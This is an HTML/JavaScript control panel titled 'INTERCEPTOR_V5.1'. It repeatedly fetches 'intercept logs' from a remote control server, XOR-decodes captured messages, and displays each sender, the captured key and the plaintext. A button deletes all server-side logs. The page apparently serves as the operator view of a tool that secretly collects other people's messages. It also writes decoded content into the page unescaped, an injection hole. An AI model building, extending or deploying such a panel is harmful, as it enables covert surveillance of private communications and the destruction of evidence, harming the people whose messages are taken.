<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>INTERCEPTOR_V5.1</title>
    <style>
        :root { --n: #00ff41; --b: #050505; --r: #ff0055; }
        body { background: var(--b); color: var(--n); font-family: monospace; padding: 20px; margin: 0; }
        header { border-bottom: 2px solid var(--n); padding-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { border: 1px solid var(--n); padding: 12px; background: rgba(0,255,65,0.1); text-align: left; }
        td { border: 1px solid #222; padding: 12px; word-break: break-all; vertical-align: top; }
        .key-found { color: var(--r); font-weight: bold; border: 1px solid var(--r); padding: 2px 5px; }
        .open { color: #0088ff; }
        .text { color: #fff; font-weight: bold; font-size: 1.1em; }
    </style>
</head>
<body>
    <header>
        <div><strong>[ SYSTEM_INTERCEPT_LOGS ]</strong></div>
        <button onclick="wipe()" style="background:var(--r); color:#000; border:none; padding:10px 20px; font-weight:bold; cursor:pointer;">PURGE_ALL</button>
    </header>
    <table>
        <thead>
            <tr>
                <th style="width:120px;">SENDER</th>
                <th style="width:150px;">KEY_INFO</th>
                <th>DECODED_CONTENT</th>
            </tr>
        </thead>
        <tbody id="logs"></tbody>
    </table>
<script>
    const API = 'https://control-u6bq.onrender.com//api';
    function crypt(t, k) {
        if (!k) return t;
        const te = new TextEncoder().encode(t);
        const ke = new TextEncoder().encode(k);
        return String.fromCharCode(...te.map((b, i) => b ^ ke[i % ke.length]));
    }
    async function wipe() { if(confirm("DELETE EVERYTHING?")) { await fetch(API, {method:'DELETE'}); update(); } }
    async function update() {
        try {
            const r = await fetch(API);
            const data = await r.text();
            const lines = data.split('\n').filter(l => l.trim()).reverse();
            const tbody = document.getElementById('logs');
            tbody.innerHTML = "";
            lines.forEach(line => {
                if(!line.includes(": ")) return;
                let [u, full] = [line.split(": ")[0], line.split(": ").slice(1).join(": ")];
                let [cipher, key] = full.split("::KEY::");
                let res = key ? decodeURIComponent(crypt(atob(cipher), key)) : decodeURIComponent(atob(cipher));
                tbody.innerHTML += `
                <tr>
                    <td>${u}</td>
                    <td>${key ? '<span class="key-found">'+key+'</span>' : '<span class="open">OPEN_MSG</span>'}</td>
                    <td class="text">${res}</td>
                </tr>`;
            });
        } catch(e) {}
    }
    setInterval(update, 3000); update();
</script>
</body>
</html>
